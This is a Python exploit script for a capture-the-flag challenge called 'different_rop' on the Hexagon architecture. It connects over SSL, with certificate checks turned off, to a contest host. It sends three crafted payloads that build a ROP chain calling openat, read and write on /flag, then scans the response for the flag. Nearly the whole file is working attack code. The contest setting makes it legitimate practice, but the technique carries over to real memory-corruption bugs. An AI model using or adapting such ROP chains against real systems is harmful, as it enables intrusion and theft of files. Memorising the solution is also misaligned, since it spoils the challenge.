#!/usr/bin/env python3
"""
Remote exploit for different_rop (Hexagon) - NepCTF 2026.
Connects over SSL, sends 3-stage ROP chain, captures flag.
"""
import struct, socket, ssl, sys, time

HOST = "fpztdaff-m4sy-lecb-yh9e-6a5acab230525-neptunus.nepctf.com"
PORT = 443

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
TRAP0    = 0x2ba08
RESTART  = 0x21168

def build_note(base, sysno, r0, r1, r2, r3=0, r4=0, r5=0, flag_str=None):
    note = bytearray(64)
    struct.pack_into('<I', note, 4, r5)
    struct.pack_into('<I', note, 8, r4)
    struct.pack_into('<I', note, 12, r3)
    struct.pack_into('<I', note, 16, r2)
    struct.pack_into('<I', note, 20, r1)
    struct.pack_into('<I', note, 24, r0)
    struct.pack_into('<I', note, 28, sysno)
    if flag_str:
        note[32:32+len(flag_str)] = flag_str
    struct.pack_into('<I', note, 48, base + 56)
    struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56)
    struct.pack_into('<I', note, 60, RESTART)
    return note

b1, b2, b3 = 0x4080e4c0, 0x4080e440, 0x4080e3c0
note1 = build_note(b1, SYS_OPENAT, AT_FDCWD, b1 + 32, 0, flag_str=b'/flag\x00')
note2 = build_note(b2, SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note(b3, SYS_WRITE, 1, BSS_BUF, 0x100)

def recv_until(sock, marker, timeout=5):
    """Receive data until marker is found."""
    sock.settimeout(timeout)
    data = b''
    while marker not in data:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    sock.settimeout(None)
    return data

def recv_some(sock, timeout=2):
    """Receive available data with timeout."""
    sock.settimeout(timeout)
    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    sock.settimeout(None)
    return data

print(f"[*] Connecting to {HOST}:{PORT} over SSL...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ssock = ctx.wrap_socket(sock, server_hostname=HOST)
ssock.connect((HOST, PORT))
print("[*] Connected!")

# Wait for initial menu
data = recv_until(ssock, b'> ')
print(f"[*] Initial banner: {len(data)} bytes")

# Stage 1: openat("/flag")
print("[*] Stage 1: openat('/flag')")
ssock.send(b'3\n' + bytes(note1) + b'\n')
data = recv_until(ssock, b'ROP Register Lab')
data += recv_until(ssock, b'> ')
print(f"[*] Stage 1 complete ({len(data)} bytes)")

# Stage 2: read(3, BSS, 0x100)
print("[*] Stage 2: read(3, BSS, 0x100)")
ssock.send(b'3\n' + bytes(note2) + b'\n')
data = recv_until(ssock, b'ROP Register Lab')
data += recv_until(ssock, b'> ')
print(f"[*] Stage 2 complete ({len(data)} bytes)")

# Stage 3: write(1, BSS, 0x100) - flag should be in output
print("[*] Stage 3: write(1, BSS, 0x100)")
ssock.send(b'3\n' + bytes(note3) + b'\n')

# Receive all remaining output
time.sleep(1)
all_out = recv_some(ssock, timeout=3)

# Exit
ssock.send(b'5\n')
time.sleep(0.5)
all_out += recv_some(ssock, timeout=2)

ssock.close()

# Parse output
output = all_out.decode(errors='replace')
print(f"\n[*] Total output: {len(output)} bytes")

# Extract flag - look for printable strings between non-printable
import re
# The flag is 21 bytes read from the file
# Look for readable ASCII in the raw output
printable = ''.join(c if 32 <= ord(c) < 127 else '.' for c in output)
print(f"\n=== RAW OUTPUT (printable) ===")
print(printable[:2000])

# Try to find flag pattern
for pattern in [r'[a-zA-Z0-9_]{10,30}', r'flag\{[^}]+\}', r'[A-Za-z][a-zA-Z0-9_]{8,30}']:
    matches = re.findall(pattern, output)
    for m in matches:
        if 'flag' in m.lower() or '_' in m:
            print(f"\n*** POSSIBLE FLAG: {m} ***")
if matches:
    pass
# Also just look for any interesting string
lines = output.split('\n')
for line in lines:
    if 'flag' in line.lower() or '{' in line or '}' in line:
        print(f"  >>> {line.strip()}")
